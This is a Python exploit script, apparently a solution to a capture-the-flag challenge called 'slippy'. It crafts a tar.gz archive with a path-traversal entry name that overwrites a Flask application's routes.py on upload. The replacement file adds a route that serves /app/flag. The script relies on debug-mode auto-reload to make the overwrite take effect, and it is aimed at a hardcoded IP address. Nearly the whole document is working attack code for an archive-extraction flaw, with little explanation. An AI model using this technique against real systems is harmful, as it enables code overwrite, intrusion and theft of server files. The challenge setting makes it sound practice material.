# This solution works because the app is running in debug mode...
#
# Flask's debug mode allows us to update source code and flask will reload it if the modification time is more recent
# than the prev file's version
#
# If we needed to exploit this in an environment where debug wasn't present, we could use the SSTI solution that
# can be found in slippy-ssti-solution.py
#
import io
import requests
import time
import tarfile

url = "http://157.245.46.136:31355"
name = "../../../../../../../../../../app/application/blueprints/routes.py"

data = b"""
from flask import Blueprint, request, render_template, abort
from application.util import extract_from_archive

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@web.route('/flag')
def flag():
    return open('/app/flag').read()

@api.route('/unslippy', methods=['POST'])
def cache():
    if 'file' not in request.files:
        return abort(400)

    extraction = extract_from_archive(request.files['file'])
    if extraction:
        return {"list": extraction}, 200

    return '', 204
"""

# Refactor this to be a function
# Comment this code better as we'll likely want to reuse it at some point
source_f = io.BytesIO(initial_bytes=data)

fh = io.BytesIO()
with tarfile.open(fileobj=fh, mode="w:gz") as tar:
    info = tarfile.TarInfo(name)
    info.size = len(data)
    info.mtime = time.time()
    tar.addfile(info, source_f)

with open("test.tar.gz", "wb") as f:
    f.write(fh.getvalue())

s = requests.Session()
r = requests.post(url + "/api/unslippy", files={"file": fh.getvalue()})

print(r.text)
print(s.get(url).text)

r = requests.get(url + "/flag")
print("Flag == " + r.text)

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
